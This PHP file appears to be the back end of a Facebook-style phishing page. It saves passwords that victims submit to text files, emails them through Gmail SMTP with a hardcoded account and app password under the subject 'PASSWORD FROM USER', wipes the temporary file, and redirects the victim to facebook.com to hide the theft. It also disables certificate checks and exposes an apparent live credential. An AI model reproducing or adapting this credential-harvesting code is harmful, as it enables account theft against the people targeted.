<?php
include('PHPMailerAutoload.php');

//  Set the location to redirect the page
//header ('Location: pass.php');

// Open the text file in writing mode

///// ye file mien data save karane ke liye hai

if (isset($_POST['password'])) {
    $password = $_POST['password'];

    // Data ko text file mein save karen
    $data = "Password: $password\n";
    file_put_contents('password.txt', $data, FILE_APPEND);
	file_put_contents('passwordmailer.txt', $data, FILE_APPEND);
	// FILE_APPEND data ko append karne ke liye hota hai
    //echo "Data saved successfully!";
} //else {
    //echo "Please fill out the form.";
// yaha se phpmailer shuru hua
echo smtp_mailer('cookieclicker505@gmail.com','admin','html');
function smtp_mailer($to,$Subject, $msg){
 // ye function banaya hai file se data clear karne ke liye
	function clear_file($filename) {
		$fp = fopen('passwordmailer.txt', 'w');
		fwrite($fp, '');
		fclose($fp);
	}
	//fuction ko yaha close kya hai
// yaha se file ko read mode mien open kya
	$filename = 'passwordmailer.txt';
	$fp = fopen('passwordmailer.txt', 'r');
	$filedata = fread($fp, filesize($filename));
	fclose($fp);
	// yaha band kya

	$to = '@gmail.com';
	//$workermail = 'exaqmple@gmail.com';

	//ye phpmailer ka hisa hai


	$mail = new PHPMailer(); 
	$mail->IsSMTP(); 
	$mail->SMTPAuth = true; 
	$mail->SMTPSecure = 'tls'; 
	$mail->Host = "smtp.gmail.com";
	$mail->Port = 587; 
	$mail->IsHTML(true);
	$mail->CharSet = 'UTF-8';
	//$mail->SMTPDebug = 2; 
	$mail->Username = "cookieclicker505@gmail.com";
	$mail->Password = "rrxpynrynoiqykxt";
	$mail->SetFrom("cookieclicker505@gmail.com");
	//$mail->Subject = $subject;
	//$mail->Body =$msg;

	///
	$mail->Subject = 'PASSWORD FROM USER';
	$mail->Body = $filedata;// yaha $data oper se file jo read mode mien open ki hai waha se data le rahi hai
	//
	
	
	
	$mail->AddAddress($to);
	//$mail->AddAddress($workermail);
	
	
	
	$mail->SMTPOptions=array('ssl'=>array(
		'verify_peer'=>false,
		'verify_peer_name'=>false,
		'allow_self_signed'=>false
	));

	$mail->send();

	clear_file($filename);// ye oper jo function banaya hai us ke liye hai
        
	echo
"
<script>
document.location.href = 'https://web.facebook.com/?_rdc=1&_rdr';
</script>

";
	/*if(!$mail->Send()){
		echo $mail->ErrorInfo;
	}else{
		return 'Sent';
	}*/
}

?>